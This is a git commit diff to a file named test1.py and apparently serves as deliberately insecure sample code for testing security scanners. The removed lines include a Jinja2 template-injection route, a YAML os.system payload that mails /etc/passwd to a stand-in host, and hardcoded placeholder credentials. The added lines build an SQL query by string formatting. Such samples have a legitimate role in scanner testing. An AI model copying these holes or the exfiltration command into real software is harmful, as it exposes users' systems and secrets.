c93513424580a4e76f623f1ccd3b77c1e9d2cd39
alexan757 <127663794+alexan757@users.noreply.github.com>
2024-02-10 20:54:25 +0300

    Update test1.py

--- test1.py
+++ test1.py
@@ -1,18 +1,12 @@
-@app.route("/page")
-def page():
-
-    name = request.values.get('name')
-
-    output = Jinja2.from_string('Hello ' + name + '!').render()
-
-    return output
-    !!python/object/apply:os.system ["cat /etc/passwd | mail me@hack.c"]
-    
-    TWITTER_OAUTH_TOKEN = "dkedjekdjekldjekldje"
-    TWITTER_OAUTH_SECRET = "dkejkdjekdjkejdkjekdjekjdkjed"
-    AWS_CREDENTIALS = { 'key': 'djekjdkejde', 'secret': 'dncndmncdmncd' }
-    LOG_SERVER = "secret.logging.internal.mozilla.com"
-    response = "<html>%s</html>" % something
-
+from django.db import connection
 import commands
 template_vars['output'] = commands.getstatusoutput('/usr/bin/process_soemthing')
+def find_user(username):
+    TWITTER_OAUTH_TOKEN = "dkedjekdjekldjekldje"
+    with connection.cursor() as cur:
+
+        cur.execute(f"""select username from USERS where name = '%s'""" % username)
+
+        output = cur.fetchone()
+
+    return output
